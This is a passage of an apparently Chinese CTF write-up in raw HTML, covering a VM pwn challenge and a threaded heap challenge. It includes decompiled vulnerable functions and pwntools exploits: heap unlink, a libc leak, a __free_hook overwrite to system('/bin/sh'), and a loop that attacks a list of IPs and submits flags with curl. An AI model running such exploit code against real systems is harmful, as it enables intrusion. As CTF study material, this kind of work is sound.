class="line"></span><br><span class="line"><span class="comment">//WIDTH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE  0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WORD  0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DWORD 0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QWORD 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIDTH(X) (X &amp; 0xf0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADDR(X)  (X &amp; 0x0f)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_O(X) (X |= 0b0000000000000001)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_S(X) (X |= 0b0000000000000010)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_Z(X) (X |= 0b0000000000000100)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_C(X) (X |= 0b0000000000001000)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_O(X) (X &amp;= ~(0b0000000000000001))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_S(X) (X &amp;= ~(0b0000000000000010))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_Z(X) (X &amp;= ~(0b0000000000000100))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_C(X) (X &amp;= ~(0b0000000000001000))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_O(X) (X &amp; 0b0000000000000001)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_S(X) ((X &amp; 0b0000000000000010) &gt;&gt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_Z(X) ((X &amp; 0b0000000000000100) &gt;&gt; 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_C(X) ((X &amp; 0b0000000000001000) &gt;&gt; 3)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">SYSCALLS</span> &#123;</span></span><br><span class="line">    _SYS_OPEN = <span class="number">0</span>,</span><br><span class="line">    _SYS_READ = <span class="number">1</span>,</span><br><span class="line">    _SYS_WRITE,</span><br><span class="line">    _SYS_CLOSE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å¾—æ‰‹æ’•æ±‡ç¼–äº†ï¼Œæˆ‘ä»¬é€‰æ‹©äº†è¾ƒä¸ºç®€å•çš„å†’æ³¡æ’åºï¼Œåˆå› ä¸ºæ²¡æœ‰é‚£ç§ç›´æ¥æ“ä½œå†…å­˜çš„æŒ‡ä»¤ï¼Œå°±åªèƒ½ç”¨å¯„å­˜å™¨ä¼ é€’ï¼Œå¯¼è‡´æ•ˆç‡å¹¶ä¸æ˜¯å¾ˆé«˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">14640</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># pass</span></span><br><span class="line">p = process(<span class="string">&quot;./BATTLE&quot;</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x555555554000+0x00000000000EEb9 if $rdx == 0x1e&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x555555554000+0x00000000000F238&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Beat Me!&quot;</span>)</span><br><span class="line">code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># loop1:</span></span><br><span class="line">code += p8(<span class="number">0x12</span>) + p8(<span class="number">0x15</span>) + p8(<span class="number">3</span>) + p8(<span class="number">99</span>)<span class="comment"># cmp r3,99</span></span><br><span class="line">code += p8(<span class="number">0x16</span>) + p8(<span class="number">0x17</span>) + p8(<span class="number">0x65</span>)<span class="comment"># JG exit</span></span><br><span class="line">code += p8(<span class="number">0x1</span>)+ p8(<span class="number">0x40</span>) + p8(<span class="number">6</span>) + p8(<span class="number">3</span>)<span class="comment"># mov r6,r3</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x15</span>) + p8(<span class="number">0</span>) + p8(<span class="number">99</span>)<span class="comment"># mov r0,99</span></span><br><span class="line">code += p8(<span class="number">0x3</span>) + p8(<span class="number">0x40</span>) + p8(<span class="number">0</span>) + p8(<span class="number">6</span>)<span class="comment"># sub r0,r6</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x45</span>) + p8(<span class="number">4</span>) + p64(<span class="number">0</span>)<span class="comment"># mov r4,0</span></span><br><span class="line"><span class="comment"># loop2:</span></span><br><span class="line">code += p8(<span class="number">0x12</span>) + p8(<span class="number">0x40</span>) + p8(<span class="number">4</span>) + p8(<span class="number">0</span>)<span class="comment"># cmp r4,r0</span></span><br><span class="line">code += p8(<span class="number">0x14</span>) + p8(<span class="number">0x17</span>) + p8(<span class="number">0x38</span>)<span class="comment">#je update</span></span><br><span class="line">code += p8(<span class="number">0x1</span>)+ p8(<span class="number">0x40</span>) + p8(<span class="number">5</span>) + p8(<span class="number">4</span>)<span class="comment">#mov r5,r4</span></span><br><span class="line">code += p8(<span class="number">0x4</span>)+ p8(<span class="number">0x25</span>)+ p8(<span class="number">5</span>) + p16(<span class="number">8</span>)<span class="comment"># mul r5,8</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x4c</span>)+ p8(<span class="number">1</span>) + p8(<span class="number">5</span>)<span class="comment"># mov r1,mem[r5]</span></span><br><span class="line">code += p8(<span class="number">0x1</span>)+ p8(<span class="number">0x40</span>) + p8(<span class="number">6</span>) + p8(<span class="number">5</span>)<span class="comment"># mov r6,r5</span></span><br><span class="line">code += p8(<span class="number">0x2</span>) + p8(<span class="number">0x25</span>)+ p8(<span class="number">6</span>) + p16(<span class="number">8</span>)<span class="comment">#add r6,8</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x4c</span>)+ p8(<span class="number">2</span>) + p8(<span class="number">6</span>)<span class="comment">#mov r2,mem[r6]</span></span><br><span class="line">code += p8(<span class="number">0x12</span>) + p8(<span class="number">0x40</span>) + p8(<span class="number">1</span>) + p8(<span class="number">2</span>)<span class="comment">#cmp r1,r2</span></span><br><span class="line">code += p8(<span class="number">0x1c</span>) + p8(<span class="number">0x17</span>) + p8(<span class="number">8</span>)<span class="comment">#jb next</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x4b</span>)+ p8(<span class="number">6</span>) + p8(<span class="number">1</span>)<span class="comment">#mov mem[r6],r1</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x4b</span>)+ p8(<span class="number">5</span>) + p8(<span class="number">2</span>)<span class="comment">#mov mem[r5],r2</span></span><br><span class="line"><span class="comment"># next:</span></span><br><span class="line">code += p8(<span class="number">0x2</span>) + p8(<span class="number">0x25</span>)+ p8(<span class="number">4</span>) + p16(<span class="number">1</span>)<span class="comment">#add r4,1</span></span><br><span class="line">code += p8(<span class="number">0x13</span>) + p8(<span class="number">0x47</span>)+ p64(-<span class="number">0x3f</span>+<span class="number">0x10000000000000000</span>)<span class="comment">#jmp loop2</span></span><br><span class="line"><span class="comment"># update:</span></span><br><span class="line">code += p8(<span class="number">0x2</span>) + p8(<span class="number">0x25</span>)+ p8(<span class="number">3</span>) + p16(<span class="number">1</span>)<span class="comment">#add r3,1</span></span><br><span class="line">code += p8(<span class="number">0x13</span>) + p8(<span class="number">0x47</span>)+ p64(-<span class="number">0x6c</span>+<span class="number">0x10000000000000000</span>)<span class="comment">#jmp loop1</span></span><br><span class="line"><span class="comment"># exit:</span></span><br><span class="line">code += p8(<span class="number">0x20</span>) + <span class="string">&quot;AAAAAAAAA&quot;</span></span><br><span class="line">p.send(code)</span><br><span class="line">p.recvuntil(<span class="string">&quot;WINNER!\n&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># p.recvuntil(&quot;ftp&gt;&quot;)</span></span><br><span class="line"><span class="comment"># p.sendline(&quot;type flag.txt&quot;)</span></span><br><span class="line"><span class="comment"># p.recv(timeout=0.5)</span></span><br><span class="line">flag = p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">info(flag)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;bad_luck&quot;</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./pwn&quot;,checksec=False)</span></span><br><span class="line">ips = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).readlines()]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">flag = main(ip)</span><br><span class="line"><span class="comment"># flag = main(args[&quot;REMOTE&quot;])</span></span><br><span class="line">info(flag)</span><br><span class="line">url = <span class="string">&#x27;https://172.20.1.1/Answerapi/sub_answer_api&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;token7024a591c07&#x27;</span></span><br><span class="line">cmds = <span class="string">&#x27;curl -k &#123;&#125; -d &quot;answer=&#123;&#125;&amp;playertoken=&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(url,flag.strip(),token)</span><br><span class="line"><span class="built_in">print</span> cmds</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> cmds:</span><br><span class="line">os.system(cmds)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line">p.close()</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>VM_pwnä¸€å®šè¦è€å¿ƒï¼ï¼ï¼ä¸€è¾¹å†™ï¼Œä¸€è¾¹è°ƒã€‚</p><h4 id="0x04-thrd"><a href="#0x04-thrd" class="headerlink" title="0x04 thrd"></a>0x04 thrd</h4><p>æœ€åä¸€é¢˜ç»ˆäºæ˜¯heapé¢˜äº†ï¼Œä½†ç‰µæ‰¯åˆ°çº¿ç¨‹çš„æ¡ä»¶ç«äº‰é—®é¢˜ï¼Œä½¿å¾—è°ƒè¯•èµ·æ¥ä¼šå¾ˆå¥‡æ€ªã€‚</p><p>æ¼æ´å­˜åœ¨äºeditå‡½æ•°ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// er12</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( heaplist[a1] )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sizelist[a1] - <span class="number">4LL</span>; å½“sizeä¸º<span class="number">0</span>æ—¶ï¼Œv3=<span class="number">-4</span>(<span class="type">unsigned</span> <span class="type">int</span>)ï¼Œé€ æˆå †æº¢å‡º</span><br><span class="line">      <span class="keyword">if</span> ( a2 &lt;= v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = a3;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line">        *(_DWORD *)(heaplist[a1] + a2) = v4;</span><br><span class="line">        LODWORD(v3) = pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªæ´æ˜¯åœ¨encä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">enc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 idx; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> content_len; <span class="comment">// er12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    idx = a1;</span><br><span class="line">    v3 = (<span class="type">const</span> <span class="type">char</span> *)heaplist[a1];</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      content_len = <span class="built_in">strlen</span>(v3);</span><br><span class="line">      pthread_mutex_lock(&amp;mutex);</span><br><span class="line">      v5 = content_len &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (content_len &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 = (_DWORD *)heaplist[idx];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (_DWORD *)heaplist[idx];</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">          pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = (__int64)&amp;v6[v5];</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        *v6 ^= a2;</span><br><span class="line">        ++v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 != (_DWORD *)v7 );</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçš„é€»è¾‘ä¸»è¦æ˜¯è¿›è¡Œäº†å¼‚æˆ–çš„æ“ä½œï¼Œä½†æ¼æ´æ˜¯strlen()å‡½æ•°ï¼Œå½“å¡«æ»¡å †åstrlenä¼šæ‹¿åˆ°ä¸‹ä¸€ä¸ªheapçš„sizeä¸ºï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªheapçš„sizeã€‚</p><p>ç¨‹åºä¸€å¼€å§‹ç»™å‡ºäº†elfåŸºåœ°å€ï¼ŒPIEç™½å¼€äº†ï¼Œè¿˜èƒ½æ§åˆ¶next heapâ€™s sizeï¼Œå› æ­¤å¯ä»¥unlinkï¼Œä½†ä¸­é—´showæ³„éœ²çš„æ—¶å€™ï¼Œç”±äºçº¿ç¨‹ç«äº‰é—®é¢˜ï¼Œéœ€è¦å¯¹heapè¿›è¡Œä¿®å¤ï¼Œå½“æ—¶æ˜¯æŠ„æµé‡æ‰çŸ¥é“çš„ï¼Œå¾ˆè¿·ã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">1</span>) + p32(idx) + p32(sz)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">3</span>) + p32(idx)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">4</span>) + p32(idx)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_</span>(<span class="params">idx,value</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">6</span>) + p32(idx) + p32(value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,value</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">2</span>) + p32(idx)+p32(offset) + p32(value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">17066</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">&quot;./pwn_bak.bak.bak&quot;</span>)</span><br><span class="line"><span class="comment"># debug(0x000000000000107B)</span></span><br><span class="line">libc.address = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;mem: &quot;</span>)</span><br><span class="line">elf_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x2021a0</span></span><br><span class="line">backdoor = elf_addr+<span class="number">0x000000000000DB0</span></span><br><span class="line">info(<span class="string">&quot;elf : &quot;</span> + <span class="built_in">hex</span>(elf_addr))</span><br><span class="line">ptr = elf_addr + <span class="number">0x000000000202120</span></span><br><span class="line">action = <span class="string">&#x27;&#x27;</span></span><br><span class="line">action += add(<span class="number">0</span>,<span class="number">0x28</span>) + add(<span class="number">1</span>,<span class="number">0xf0</span>) + add(<span class="number">2</span>,<span class="number">0xf0</span>) + add(<span class="number">3</span>,<span class="number">0xf0</span>) + add(<span class="number">4</span>,<span class="number">0xf0</span>) + add(<span class="number">5</span>,<span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x28</span>,<span class="number">4</span>):</span><br><span class="line">action += edit(<span class="number">0</span>,i,u32(<span class="string">&quot;efbead6e&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">action += xor_(<span class="number">0</span>,<span class="number">0x401</span>)</span><br><span class="line"></span><br><span class="line">data = p32(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">data += p32(<span class="number">0xffffffff</span>&amp;(ptr-<span class="number">0x18</span>)) + p32((ptr-<span class="number">0x18</span>)&gt;&gt;<span class="number">32</span>)</span><br><span class="line">data += p32(<span class="number">0xffffffff</span>&amp;(ptr-<span class="number">0x10</span>)) + p32((ptr-<span class="number">0x10</span>)&gt;&gt;<span class="number">32</span>)</span><br><span class="line">data += p32(<span class="number">0x20</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x28</span>,<span class="number">4</span>):</span><br><span class="line">action += edit(<span class="number">0</span>,i,u32(data[i:i+<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line">action += dele(<span class="number">1</span>) + add(<span class="number">6</span>,<span class="number">0xf0</span>)</span><br><span class="line">action += edit(<span class="number">6</span>,<span class="number">0x10</span>,<span class="number">0x30</span>) + edit(<span class="number">6</span>,<span class="number">0x18</span>,<span class="number">0x11</span>)</span><br><span class="line">action += edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="number">0xffffffff</span>&amp;ptr) + edit(<span class="number">0</span>,<span class="number">0x1c</span>,ptr&gt;&gt;<span class="number">32</span>)</span><br><span class="line">action += edit(<span class="number">0</span>,<span class="number">0x8</span>,<span class="number">0xffffffff</span>&amp;(elf_addr+<span class="number">0x201F50</span>)) + edit(<span class="number">0</span>,<span class="number">0xc</span>,(elf_addr+<span class="number">0x201F50</span>)&gt;&gt;<span class="number">32</span>)</span><br><span class="line">action += show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(action)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action = <span class="string">&#x27;&#x27;</span></span><br><span class="line">action += edit(<span class="number">0</span>,<span class="number">0x10</span>,<span class="number">0xffffffff</span>&amp;(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">8</span>)) + edit(<span class="number">0</span>,<span class="number">0x14</span>,(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">8</span>)&gt;&gt;<span class="number">32</span>)</span><br><span class="line">action += edit(<span class="number">2</span>,<span class="number">0</span>,u32(<span class="string">&quot;/bin&quot;</span>)) + edit(<span class="number">2</span>,<span class="number">0x4</span>,u32(<span class="string">&quot;/sh\x00&quot;</span>))</span><br><span class="line">action += edit(<span class="number">2</span>,<span class="number">8</span>,<span class="number">0xffffffff</span>&amp;(libc.symbols[<span class="string">&quot;system&quot;</span>])) + edit(<span class="number">2</span>,<span class="number">0xc</span>,(libc.symbols[<span class="string">&quot;system&quot;</span>])&gt;&gt;<span class="number">32</span>)</span><br><span class="line">action += dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(action)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;;echo hack_by_qwruan &amp;&amp; cat flag&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;qwruan\n&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recvuntil(<span class="string">&quot;flag&quot;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">flag = <span class="string">&quot;flag&quot;</span> + p.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">info(flag)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> 